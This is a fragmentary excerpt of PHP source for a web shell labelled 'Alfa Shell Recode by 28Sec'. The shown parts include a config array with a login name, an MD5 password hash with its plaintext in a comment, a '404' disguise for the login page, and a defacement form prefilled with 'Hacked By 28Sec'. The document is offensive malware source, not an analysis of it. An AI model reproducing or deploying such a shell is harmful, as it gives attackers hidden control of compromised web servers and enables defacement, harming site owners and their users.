...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'whoami',
    'password' => '57b0f999ce325fd323e85db1a55a0c1f',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '404',
    'show_icons' => '1',
...
<font color='#00A220'>Alfa Shell Recode by 28Sec</font><br>
<font color='#00A220'>Contact : whoami@thereisnoadmin.com</font><br>
<font color='#FF0000'>ex scientia, securitas</font><br>
...
<textarea name=index rows='19' cols='103'><title>Hacked By 28Sec</title><b>Hacked By 28Sec</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By 28Sec</title><b>Hacked By 28Sec</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
echo("<center><table border='1'>");
echo("<tr><td><b><font color=\"#FFFF00\">Register</font></td><td>$registrar</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFF00\">Setting</font></td><td>$setting</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFF00\">Value</font></td><td>$value</td></tr></b>");
echo "</table><br><br></center>";
}
}
